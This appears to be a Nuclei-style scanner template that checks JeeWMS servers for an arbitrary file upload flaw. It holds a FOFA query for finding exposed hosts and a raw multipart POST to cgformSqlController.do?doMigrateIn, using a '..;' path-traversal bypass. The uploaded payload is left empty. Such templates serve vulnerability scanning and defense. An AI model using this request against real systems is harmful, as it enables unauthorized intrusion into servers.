id: JeeWMS-cgformSqlController-File-upload

info:
  name: jeewms-cgformSqlController-任意文件上传
  author: HuanXiong
  severity: high
  description: |-
    fofa: fofa：body="loginController.do?login"
  reference:
    - 
  tags: File upload

http:
  - raw:
      - |
        POST /api/..;/cgformSqlController.do?doMigrateIn HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Connection: keep-alive
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Content-Length: 5383
        Content-Type: multipart/form-data; boundary=a8a7a43f9cfe9bf4bf6fe625b5084950

        --a8a7a43f9cfe9bf4bf6fe625b5084950
        Content-Disposition: form-data; name="file"; filename="1.zip"
        Content-Type: application/x-zip-compressed

        {{base64_decode("")}}
        --a8a7a43f9cfe9bf4bf6fe625b5084950--

    matchers:
      - type: dsl
        name: 任意文件上传
        dsl:
          - "status_code == 200 && contains (body,'SQL')"
